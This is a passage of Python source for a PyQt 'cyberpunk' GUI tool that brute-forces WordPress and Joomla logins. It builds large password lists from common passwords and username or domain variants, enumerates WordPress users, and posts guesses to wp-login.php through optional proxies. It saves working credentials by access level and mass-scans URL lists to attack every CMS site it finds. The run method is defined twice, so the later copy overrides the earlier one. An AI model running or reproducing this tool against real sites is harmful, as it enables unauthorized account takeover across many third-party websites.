            "admin", "password", "123456", "12345@67890", "1234567890", "Demo", "demo", "manager", "12345678", "1234", "12345", 
            "qwerty", "12345@6789", "12345@678", "12345@6780", "67890",  "12345@67890","12345@98760","12345@abcde","12345@ABCDE","12345@!@#$%",
            "12345@67890Ab","12345@password","12345@secure","12345@qwerty",
            "12345@admin123" , "letmein", "admin123", "welcome", "monkey", "sunshine",
            "password1", "123456789", "football", "iloveyou", "starwars", "dragon",
            "passw0rd", "master", "hello", "freedom", "whatever", "qazwsx", "trustno1",
            "654321", "jordan23", "harley", "password123", "1q2w3e4r", "555555",
            "loveme", "hello123", "zaq1zaq1", "abc123", "123123", "donald", "batman",
            "access", "shadow", "superman", "qwerty123", "michael", "mustang", "jennifer",
            "admin", "password", "123456", "Demo", "demo", "manager",  "12345678", "1234", "12345", 
            "qwerty", "letmein", "admin123", "welcome", "monkey", "sunshine",
            "password1", "123456789", "football", "iloveyou", "starwars", "dragon",
            "passw0rd", "master", "hello", "freedom", "whatever", "qazwsx", "trustno1",
            "654321", "jordan23", "harley", "password123", "1q2w3e4r", "555555",
            "loveme", "hello123", "zaq1zaq1", "abc123", "123123", "donald", "batman",
            "access", "shadow", "superman", "qwerty123", "michael", "mustang", "jennifer",
            "111111", "2000", "jordan", "super123", "123456a", "andrew", "matthew",
            "golfer", "buster", "nicole", "jessica", "pepper", "1111", "zxcvbn", "555555",
            "11111111", "131313", "freedom1", "7777777", "pass", "maggie", "159753",
            "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer",
            "love", "ashley", "6969", "nicole1", "chelsea", "biteme", "matthew1",
            "access14", "yankees", "987654321", "dallas", "austin", "thunder", "taylor",
            "matrix", "minecraft", "buster1", "hello1", "charlie", "1234567", "1234567890",
            "888888", "123123123", "flower", "password2", "soccer", "purple", "george",
            "chicken", 'samsung', 'apple', 'google', 'microsoft', 'ibm', 'intel', 'amd', 'nvidia',
            'yahoo', 'hotmail', 'gmail', 'outlook', 'live', 'skype', 'facebook',
            'twitter', 'instagram', 'linkedin', 'youtube', 'whatsapp', 'telegram',
            'discord', 'slack', 'zoom', 'team', 'office', 'home', 'work',
            'school', 'college', 'university', 'student', 'teacher', 'professor',
            'manager', 'director', 'ceo', 'cto', 'cfo', 'admin1', 'admin2',
            'admin3', 'sysadmin', 'webadmin', 'server', 'ftp', 'ssh', 'http',
            'https', 'ftpadmin', 'dbadmin', 'mailadmin', 'webmaster', 'postgres',
            'apache', 'nginx', 'iis', 'tomcat', 'ubuntu', 'debian', 'centos',
            'redhat', 'fedora', 'windows', 'linux', 'macos', 'android', 'ios',
            'backup', 'archive', 'data', 'database', 'storage', 'security',
            'firewall', 'vpn', 'network', 'wifi', 'ethernet', 'bluetooth',
            'wireless', 'router', 'switch', 'gateway', 'modem', 'broadband',
            'dsl', 'cable', 'fiber', 'voip', 'pbx', 'phone', 'mobile', 'tablet',
            'desktop', 'laptop', 'notebook', 'workstation', 'server1', 'server2',
            'server3', 'vmware', 'virtualbox', 'docker', 'kubernetes', 'jenkins',
            'gitlab', 'github', 'bitbucket', 'jira', 'confluence', 'trello',
            'wordpress', 'joomla', 'drupal', 'magento', 'prestashop', 'opencart',
            'phpbb', 'mybb', 'smf', 'vbulletin', 'xenforo', 'ipboard',
            'admin123!', 'Admin123', 'Admin@123', 'Admin#123', 'Admin$123',
            'P@ssw0rd', 'P@ssword123', 'Passw0rd!', 'Qwerty@123', 'Qwerty123!',
            '1qaz@WSX', '2wsx#EDC', '3edc$RFV', '4rfv%TGB', '5tgb^YHN',
            '6yhn&UJM', '7ujm*IK<', '8ik,(OL>', '9ol.)P:?', '0p;/[\'{]',
            '!@#$%^&*', '!QAZ2wsx', '1q2w3e4r5t', '1q2w3e4r', '1q2w3e',
            'zaq1@WSX', 'xsw2#EDC', 'cde3$RFV', 'vfr4%TGB', 'bgt5^YHN',
            'nhy6&UJM', 'mju7*IK<', ',ki8(OL>)', '.lo9(P:?)', '/;p0[\'{]'
        ]
        
        for pwd in common_passwords:
            passwords.add(pwd)
        
        # Add username-based passwords
        if username:
            # Add username variations
            username_variations = [
                username,
                username + '123',
                username + '1234',
                username + '12345',
                username + '123456',
                username + '!',
                username + '@',
                username + '#',
                username + '2023',
                username + '2024',
                username.lower(),
                username.upper(),
                username.capitalize(),
                username + '1',
                username + '0',
                username + '00',
                username + '000',
                username + '0000',
                username + 'admin',
                'admin' + username,
                username + 'user',
                'user' + username,
                username + 'pass',
                'pass' + username,
                username + 'pw',
                'pw' + username
            ]
            
            for variation in username_variations:
                passwords.add(variation)
                
                # Add special character variations
                special_chars = ['!', '@', '#', '$', '%', '^', '&', '*', '()', '{}', '[]', '.', '_', '-']
                for char in special_chars:
                    passwords.add(variation + char)
                    passwords.add(char + variation)
                    passwords.add(char + variation + char)
        
        # Add domain-based passwords
        if domain:
            domain_parts = domain.split('.')
            domain_base = domain_parts[0]
            
            # Add domain name variations
            domain_variations = [
                domain_base,
                domain_base + '123',
                domain_base + '1234',
                domain_base + '12345',
                domain_base + '123456',
                domain_base + '2023',
                domain_base + '2024',
                domain_base + '!',
                domain_base + '@',
                domain_base + '#',
                domain_base + 'admin',
                'admin' + domain_base,
                domain_base + 'user',
                'user' + domain_base,
                domain_base + 'pass',
                'pass' + domain_base,
                domain_base + 'pw',
                'pw' + domain_base
            ]
            
            for variation in domain_variations:
                passwords.add(variation)
                
                # Add special character variations
                special_chars = ['!', '@', '#', '$', '%', '^', '&', '*', '()', '{}', '[]', '.', '_', '-']
                for char in special_chars:
                    passwords.add(variation + char)
                    passwords.add(char + variation)
                    passwords.add(char + variation + char)
            
            # Ajout des nombres de 0 à 1000 avec le domaine
            for i in range(1001):
                passwords.add(domain_base + str(i))
                passwords.add(domain_base + str(i).zfill(2))
                passwords.add(domain_base + str(i).zfill(3))
                passwords.add(domain_base + str(i).zfill(4))
        
        # Add number variations (01 to 1000)
        for i in range(1, 1001):
            num_str = str(i).zfill(2)  # Pad with zeros
            passwords.add(num_str)
            passwords.add(num_str + '!')
            passwords.add(num_str + '@')
            passwords.add(num_str + '#')
            
        # Add year variations (1801 to 2050)
        for year in range(1801, 2051):
            passwords.add(str(year))
            passwords.add(str(year) + '!')
            passwords.add(str(year) + '@')
            passwords.add(str(year) + '#')
        
        # Add special character variations for all passwords
        base_passwords = list(passwords)  # Create a copy to avoid modifying during iteration
        special_chars = ['!', '@', '#', '$', '%', '^', '&', '*', '()', '{}', '[]', '.', '_', '-']
        
        for pwd in base_passwords:
            for char in special_chars:
                # Add special character at the end
                passwords.add(pwd + char)
                # Add special character at the beginning
                passwords.add(char + pwd)
                # Add special character at both ends
                passwords.add(char + pwd + char)
        
        return list(passwords)

    def run(self):
        url = self.kwargs.get('url', '')
        self.log(f"Starting WordPress attack on: {url}", "#00ffff")
        
        # Découvrir les usernames si nécessaire
        username = self.kwargs.get('username', '')
        auto_user = self.kwargs.get('auto_user', False)
        
        discovered_users = []
        if auto_user or not username:
            self.log("Attempting to discover WordPress usernames...", "#00ffff")
            discovered_users = self.get_wordpress_users(url)
            
            if discovered_users:
                self.log(f"Discovered {len(discovered_users)} user(s): {', '.join(discovered_users)}", "#00ff00")
                # Utiliser le premier utilisateur trouvé si aucun n'est spécifié
                if not username and discovered_users:
                    username = discovered_users[0]
                    self.log(f"Using first discovered user: {username}", "#00ff00")
            else:
                self.log("No users discovered. Using 'admin' as default.", "#ff0000")
                username = 'admin'
        else:
            discovered_users = [username]
        
        # Get password list
        password_file = self.kwargs.get('password_file', '')
        auto_pass = self.kwargs.get('auto_pass', False)
        domain = self.kwargs.get('domain', '')
        
        passwords = []
        if auto_pass:
            # Générer les mots de passe automatiquement
            passwords = self.generate_auto_passwords(username, domain)
            self.log(f"Generated {len(passwords)} passwords automatically", "#00ff00")
        elif password_file:
            try:
                # Try different encodings to handle the file
                encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252']
                for encoding in encodings:
                    try:
                        with open(password_file, 'r', encoding=encoding) as f:
                            passwords = [line.strip() for line in f if line.strip()]
                        break
                    except UnicodeDecodeError:
                        continue
                if not passwords:
                    self.log(f"Could not read password file with any encoding: {password_file}", "#ff0000")
                    return
                self.log(f"Loaded {len(passwords)} passwords from wordlist", "#00ff00")
            except FileNotFoundError:
                self.log(f"Password file not found: {password_file}", "#ff0000")
                return
        else:
            self.log("No passwords specified", "#ff0000")
            return
        
        # Execute brute force
        self.log(f"Starting attack with user: {username}", "#00ffff")
        self.log(f"Total login attempts to try: {len(passwords)}", "#ffff00")
        
        success = self.do_brute_force(url, username, passwords)
        
        if success:
            self.log("Attack completed successfully!", "#00ff00")
        else:
            self.log("Attack completed - no valid credentials found", "#ffff00")

    def run(self):
        url = self.kwargs.get('url', '')
        self.log(f"Starting WordPress attack on: {url}", "#00ffff")
        
        # Découvrir les usernames si nécessaire
        username = self.kwargs.get('username', '')
        auto_user = self.kwargs.get('auto_user', False)
        
        discovered_users = []
        if auto_user or not username:
            self.log("Attempting to discover WordPress usernames...", "#00ffff")
            discovered_users = self.get_wordpress_users(url)
            
            if discovered_users:
                self.log(f"Discovered {len(discovered_users)} user(s): {', '.join(discovered_users)}", "#00ff00")
                # Utiliser le premier utilisateur trouvé si aucun n'est spécifié
                if not username and discovered_users:
                    username = discovered_users[0]
                    self.log(f"Using first discovered user: {username}", "#00ff00")
            else:
                self.log("No users discovered. Using 'admin' as default.", "#ff0000")
                username = 'admin'
        else:
            discovered_users = [username]
        
        # Get password list
        password_file = self.kwargs.get('password_file', '')
        if password_file:
            try:
                # Try different encodings to handle the file
                encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252']
                for encoding in encodings:
                    try:
                        with open(password_file, 'r', encoding=encoding) as f:
                            passwords = [line.strip() for line in f if line.strip()]
                        break
                    except UnicodeDecodeError:
                        continue
                if not passwords:
                    self.log(f"Could not read password file with any encoding: {password_file}", "#ff0000")
                    return
                self.log(f"Loaded {len(passwords)} passwords from wordlist", "#00ff00")
            except FileNotFoundError:
                self.log(f"Password file not found: {password_file}", "#ff0000")
                return
        else:
            self.log("No passwords specified", "#ff0000")
            return
        
        # Execute brute force
        self.log(f"Starting attack with user: {username}", "#00ffff")
        self.log(f"Total login attempts to try: {len(passwords)}", "#ffff00")
        
        success = self.do_brute_force(url, username, passwords)
        
        if success:
            self.log("Attack completed successfully!", "#00ff00")
        else:
            self.log("Attack completed - no valid credentials found", "#ffff00")
    
    def do_brute_force(self, url, username, passwords):
        total_passwords = len(passwords)
        
        for i, password in enumerate(passwords):
            if self.should_stop():
                self.log("Attack stopped by user", "#ff0000")
                return False
                
            password = password.strip()
            
            # Réinitialiser la session à chaque tentative pour éviter les faux positifs
            self.session = requests.Session()
            self.session.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'})
            
            # Try login
            try:
                success, message = self.check_login(url, username, password)
                
                if success:
                    self.log(f"SUCCESS: Valid credentials found: {username}:{password} - {message}", "#00ff00")
                    # Save credentials
                    self.save_credentials(url, username, password, message)
                    return True
                else:
                    if self.kwargs.get('verbose', False):
                        progress = f"({i+1}/{total_passwords})"
                        self.log(f"FAIL: {username}:{password} {progress}", "#ff0000")
            
            except Exception as e:
                self.log(f"Request failed: {e}", "#ff0000")
            
            # Delay between requests if specified
            delay = self.kwargs.get('delay', 0)
            if delay > 0:
                sleep(delay)
                
            # Update progress
            self.progress(int((i + 1) * 100 / total_passwords))
        
        self.log(f"No valid password found for user: {username}", "#ffff00")
        return False
    
    def check_login(self, url, username, password):
        """Vérifie les identifiants de connexion WordPress"""
        try:
            # Normaliser l'URL
            if not url.startswith('http'):
                url = f'http://{url}'
            
            login_url = urljoin(url, "/wp-login.php")
            
            # Configurer les headers
            headers = HEADERS.copy()
            headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'
            
            # Configurer le proxy si nécessaire
            proxy_str = self.kwargs.get('proxy', '')
            proxies = None
            if proxy_str:
                parsed_proxy_url = urlparse(proxy_str)
                proxies = {parsed_proxy_url.scheme: parsed_proxy_url.netloc}
            
            # Vérifier d'abord si c'est une page de login WordPress
            response = self.session.get(
                login_url,
                headers=headers,
                proxies=proxies,
                timeout=REQUEST_TIMEOUT,
                allow_redirects=True
            )
            
            if not response or 'wp-login.php' not in response.url:
                return False, 'Not a WordPress login page'
            
            # Préparer les données de login
            login_data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': urljoin(url, "/wp-admin/"),
                'testcookie': '1'
            }
            
            # Effectuer la tentative de login
            response = self.session.post(
                login_url,
                data=login_data,
                headers=headers,
                proxies=proxies,
                timeout=REQUEST_TIMEOUT,
                allow_redirects=True
            )
            
            if not response:
                return False, 'Login request failed'
            
            # Vérifier si le login a réussi
            if 'wp-admin' in response.url and 'wp-login.php' not in response.url:
                # Vérifier les permissions
                if self.check_profile_access(url):
                    return True, 'Login successful (limited access)'
                else:
                    return True, 'Login successful (full access)'
            
            return False, 'Bad credentials'
        
        except requests.exceptions.RequestException as e:
            return False, f'Connection error: {str(e)}'
        except Exception as e:
            return False, f'Unknown error: {str(e)}'
    
    def check_profile_access(self, url):
        """Vérifie si l'utilisateur a seulement accès à profile.php"""
        try:
            # Test d'accès à profile.php
            profile_url = urljoin(url, "/wp-admin/profile.php")
            profile_response = self.make_request(profile_url)

            if profile_response and profile_response.status_code == 200 and "Profile" in profile_response.text:
                # Test d'accès à une page admin (options-general.php)
                admin_url = urljoin(url, "/wp-admin/options-general.php")
                admin_response = self.make_request(admin_url)
                
                if admin_response and admin_response.status_code == 200 and "General Settings" in admin_response.text:
                    return False  # Full access
                return True  # Limited access
            return False
        except:
            return False
    
    def make_request(self, url, method='GET', data=None, headers=None, allow_redirects=True):
        """Effectue une requête HTTP avec gestion des erreurs"""
        retries = 0
        last_exception = None
        
        # Configurer les headers
        request_headers = HEADERS.copy()
        if headers:
            request_headers.update(headers)
        
        # Utiliser le user-agent
        request_headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'
        
        # Configurer le proxy
        proxy_str = self.kwargs.get('proxy', '')
        proxies = None
        if proxy_str:
            parsed_proxy_url = urlparse(proxy_str)
            proxies = {parsed_proxy_url.scheme: parsed_proxy_url.netloc}
        
        while retries < MAX_RETRIES:
            try:
                session = requests.Session()
                session.headers.update(request_headers)
                
                if method.upper() == 'GET':
                    response = session.get(
                        url, 
                        timeout=REQUEST_TIMEOUT, 
                        allow_redirects=allow_redirects,
                        proxies=proxies
                    )
                else:
                    response = session.post(
                        url, 
                        data=data, 
                        timeout=REQUEST_TIMEOUT, 
                        allow_redirects=allow_redirects,
                        proxies=proxies
                    )
                
                return response
            
            except requests.exceptions.RequestException as e:
                last_exception = e
                retries += 1
                if retries < MAX_RETRIES:
                    time.sleep(1 * retries)
        
        return None
    
    def save_credentials(self, url, username, password, message):
        """Enregistre le résultat dans le fichier approprié"""
        try:
            with self.lock:
                if "full access" in message.lower():
                    with open(FULL_ACCESS_FILE, "a") as f:
                        f.write(f"{url}/wp-login.php#{username}@{password}\n")
                else:
                    with open(LIMITED_ACCESS_FILE, "a") as f:
                        f.write(f"{url}/wp-login.php#{username}@{password}\n")
                
                self.log(f"Saved credentials: {url}/wp-login.php#{username}@{password}", "#00ff00")
        except Exception as e:
            self.log(f"Failed to save result: {str(e)}", "#ff0000")


class MassScannerGUI:
    def __init__(self, **kwargs):
        self.kwargs = kwargs
        self.log_callback = None
        self.progress_callback = None
        self.stop_check = None
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'})
        self.lock = Lock()
        self.found_credentials = []
        self.cms_detector = CMSDetector()
        
    def log(self, message, color="#00ffff"):
        if self.log_callback:
            self.log_callback(message, color)
            
    def progress(self, value):
        if self.progress_callback:
            self.progress_callback(value)
            
    def should_stop(self):
        return self.stop_check() if self.stop_check else False
        
    def run(self):
        url_file = self.kwargs.get('url_file', '')
        self.log(f"Starting mass scan with URLs from: {url_file}", "#00ffff")
        
        try:
            # Try different encodings to handle the file
            encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252']
            for encoding in encodings:
                try:
                    with open(url_file, 'r', encoding=encoding) as f:
                        urls = [line.strip() for line in f if line.strip()]
                    break
                except UnicodeDecodeError:
                    continue
            if not urls:
                self.log(f"Could not read URL file with any encoding: {url_file}", "#ff0000")
                return
        except FileNotFoundError:
            self.log(f"URL file not found: {url_file}", "#ff0000")
            return
            
        self.log(f"Loaded {len(urls)} URLs for scanning", "#00ff00")
        
        # Scan URLs to detect CMS type
        joomla_urls = []
        wordpress_urls = []
        unknown_urls = []
        threads = self.kwargs.get('threads', 5)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            future_to_url = {executor.submit(self.cms_detector.detect_cms, url): url for url in urls}
            
            for i, future in enumerate(concurrent.futures.as_completed(future_to_url)):
                if self.should_stop():
                    self.log("Mass scan stopped by user", "#ff0000")
                    return
                    
                url = future_to_url[future]
                try:
                    cms_type, version, target_url = future.result()
                    if cms_type == "joomla":
                        version_str = f"v{version}" if version else "unknown version"
                        self.log(f"Joomla found: {url} ({version_str})", "#00ff00")
                        joomla_urls.append((url, version))
                    elif cms_type == "wordpress":
                        version_str = f"v{version}" if version else "unknown version"
                        self.log(f"WordPress found: {url} ({version_str})", "#00ff00")
                        wordpress_urls.append((url, version))
                    else:
                        if self.kwargs.get('verbose', False):
                            self.log(f"Unknown CMS: {url}", "#ff0000")
                        unknown_urls.append(url)
                except Exception as e:
                    if self.kwargs.get('verbose', False):
                        self.log(f"Error scanning {url}: {e}", "#ff0000")
                
                # Update progress
                self.progress(int((i + 1) * 100 / len(urls)))
        
        self.log(f"Found {len(joomla_urls)} Joomla sites and {len(wordpress_urls)} WordPress sites", "#00ff00")
        
        # Process Joomla sites
        if joomla_urls:
            self.log(f"\n[*] Processing {len(joomla_urls)} Joomla sites", "#ff00ff")
            for i, (url, version) in enumerate(joomla_urls):
                if self.should_stop():
                    self.log("Mass scan stopped by user", "#ff0000")
                    return
                    
                self.log(f"Attacking Joomla: {url} (v{version if version else 'unknown'})", "#ff00ff")
                
                # Create Joomla scanner for this target
                joomla_scanner = JoomlaBruteForceGUI(**self.kwargs)
                joomla_scanner.log_callback = self.log_callback
                joomla_scanner.progress_callback = self.progress_callback
                joomla_scanner.stop_check = self.stop_check
                
                # Set specific URL for this target
                joomla_scanner.kwargs['url'] = url
                
                # Run Joomla attack
                try:
                    joomla_scanner.run_single_scan()
                except Exception as e:
                    self.log(f"Error attacking {url}: {str(e)}", "#ff0000")
                
                # Update progress
                self.progress(int((i + 1) * 100 / len(joomla_urls)))
        
        # Process WordPress sites
        if wordpress_urls:
            self.log(f"\n[*] Processing {len(wordpress_urls)} WordPress sites", "#ff00ff")
            for i, (url, version) in enumerate(wordpress_urls):
                if self.should_stop():
                    self.log("Mass scan stopped by user", "#ff0000")
                    return
                    
                self.log(f"Attacking WordPress: {url} (v{version if version else 'unknown'})", "#ff00ff")
                
                # Create WordPress scanner for this target
                wordpress_scanner = WordPressBruteForceGUI(**self.kwargs)
                wordpress_scanner.log_callback = self.log_callback
                wordpress_scanner.progress_callback = self.progress_callback
                wordpress_scanner.stop_check = self.stop_check
                
                # Set specific URL for this target
                wordpress_scanner.kwargs['url'] = url
                
                # Run WordPress attack
                try:
                    wordpress_scanner.run()
                except Exception as e:
                    self.log(f"Error attacking {url}: {str(e)}", "#ff0000")
                
                # Update progress
                self.progress(int((i + 1) * 100 / len(wordpress_urls)))
                
        self.log("Mass scan completed!", "#00ff00")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    
    # Apply cyberpunk style
    CyberpunkStyle.apply(app)
    
    # Create and show the transparent window
    window = TransparentWindow()
    window.show()
    
    sys.exit(app.exec_())